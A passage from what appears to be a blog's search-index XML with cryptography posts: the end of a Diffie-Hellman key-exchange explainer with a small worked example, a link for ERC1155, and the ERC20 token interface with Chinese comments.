-10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>, and computes her public value, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="2.113ex" height="1.991ex" role="img" focusable="false" viewBox="0 -674.8 934.1 879.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></g></svg></mjx-container>.</li><li>Bob selects a private value, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>, and computes his public value, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.953ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 863.3 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g></svg></mjx-container>.</li><li>Alice sends her public value to Bob.</li><li>Bob sends his public value to Alice.</li><li>Alice computes the shared secret, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.893ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 7024.5 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(922.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1978.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(2367.6,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="msup" transform="translate(3230.9,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(4354.7,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mi" transform="translate(6521.5,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>.</li><li>Bob computes the shared secret, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.893ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 7024.5 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(922.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1978.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(2367.6,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="msup" transform="translate(3301.6,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mo" transform="translate(4354.7,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mi" transform="translate(6521.5,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>.</li><li>Alice and Bob can now use the shared secret to encrypt their communications.</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">g</span>: <span class="number">2</span></span><br><span class="line"><span class="attr">p</span>: <span class="number">13</span></span><br><span class="line"><span class="attr">a</span>: <span class="number">5</span></span><br><span class="line">  <span class="title class_">PKa</span>: g^a = <span class="number">32</span></span><br><span class="line"><span class="attr">b</span>: <span class="number">8</span></span><br><span class="line">  <span class="title class_">PKb</span>: g^b = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Sa</span>: (<span class="title class_">PKb</span> ^ a) mod p = (g^b = <span class="number">256</span>) ^ <span class="number">5</span> % <span class="number">13</span> = <span class="number">3</span></span><br><span class="line"><span class="title class_">Sb</span>: (<span class="title class_">PKa</span> ^ b) mod p = <span class="number">32</span> ^ <span class="number">8</span> % <span class="number">13</span> = <span class="number">3</span></span><br><span class="line"><span class="attr">S</span>: (<span class="number">2</span>^<span class="number">8</span>)^<span class="number">5</span> % <span class="number">13</span> = <span class="number">3</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diffie Hellman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Double Ratchet</title>
      <link href="/2023/04/18/crypto/Double%20Ratchet/"/>
      <url>/2023/04/18/crypto/Double%20Ratchet/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Double Ratchet </tag>
            
            <tag> Signal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC1155 Multi Token Standard</title>
      <link href="/2023/04/18/crypto/ERC1155/"/>
      <url>/2023/04/18/crypto/ERC1155/</url>
      
        <content type="html"><![CDATA[<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://eips.ethereum.org/EIPS/eip-1155">https://eips.ethereum.org/EIPS/eip-1155</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ERC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC20 Token Standard</title>
      <link href="/2023/04/18/crypto/ERC20%20Token%20Standard/"/>
      <url>/2023/04/18/crypto/ERC20%20Token%20Standard/</url>
      
        <content type="html"><![CDATA[<h2 id="协议定义"><a href="#协议定义" class="headerlink" title="协议定义"></a>协议定义</h2><h3 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OPTIONAL</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">name</span>(<span class="params"></span>) <span class="keyword">public</span> view returns (<span class="built_in">string</span>)</span><br><span class="line"><span class="comment">// OPTIONAL</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">symbol</span>(<span class="params"></span>) <span class="keyword">public</span> view returns (<span class="built_in">string</span>)</span><br><span class="line"><span class="comment">// OPTIONAL</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decimals</span>(<span class="params"></span>) <span class="keyword">public</span> view returns (uint8)</span><br><span class="line"><span class="comment">// 返回代币总供应量</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) <span class="keyword">public</span> view returns (uint256)</span><br><span class="line"><span class="comment">// 返回地址为 _owner 的另一个账户的账户余额</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _owner</span>) <span class="keyword">public</span> view returns (uint256 balance)</span><br><span class="line"><span class="comment">// 将 _value 数量的代币转移到地址 _to ，并且必须触发 Transfer 事件。如果消息调用者的账户余额没有足够的代币可花费，该函数应该 throw</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="keyword">public</span> returns (bool success)</span><br><span class="line"><span class="comment">// 将 _value 数量的代币从地址 _from 转移到地址 _to ，并且必须触发 Transfer 事件</span></span><br><span class="line"><span class="comment">// 注意 0 值的传输必须被视为正常传输并触发 Transfer 事件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address _from, address _to, uint256 _value</span>) <span class="keyword">public</span> returns (bool success)</span><br><span class="line"><span class="comment">// 允许 _spender 多次从您的帐户中提款，最多为 _value 金额。如果再次调用此函数，它会用 _value 覆盖当前限额</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address _spender, uint256 _value</span>) <span class="keyword">public</span> returns (bool success)</span><br><span class="line"><span class="comment">// 返回仍然允许 _spender 从 _owner 中提取的金额</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">allowance</span>(<span class="params">address _owner, address _spender</span>) <span class="keyword">public</span> view returns (uint256 remaining)</span><br></pre></td></tr></table></figure><h3 id="事件定义"><a href="#事件定义" class="headerlink" title="事件定义"></a>事件定义</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Transfer Event</span></span><br><span class="line"><span class="comment">// 必须在代币转移时触发，包括零价值转移。</span></span><br><span class="line">event <span class="title class_">Transfer</span>(address indexed _from, address indexed _to, uint256 _value)</span><br><span class="line"><span class="comment">// Approval Event</span></span><br><span class="line"><span class="comment">// 必须在任何成功调用 approve(address _spender, uint256 _value) 时触发</span></span><br><span class="line">event <span class="title class_">Approval</span>(address indexed _owner, address indexed _spender, uint256 _value)</span><br></pre></td></tr></table></figure><h2 id="社区实现"><a href="#社区实现" class="headerlink" title="社区实现"></a>社区实现</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span 